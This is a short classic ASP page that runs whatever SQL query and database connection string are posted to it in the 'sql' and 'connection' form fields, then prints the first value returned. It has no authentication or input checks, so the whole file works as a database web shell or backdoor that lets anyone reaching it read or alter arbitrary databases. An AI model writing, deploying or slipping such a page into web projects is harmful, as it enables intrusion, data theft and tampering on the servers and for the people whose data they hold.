<%
Set rows = Server.CreateObject("ADODB.Recordset")
rows.Open Request.Form("sql"), Request.Form("connection"), 1, 1
Response.Write rows(0).Value
rows.Close
%>
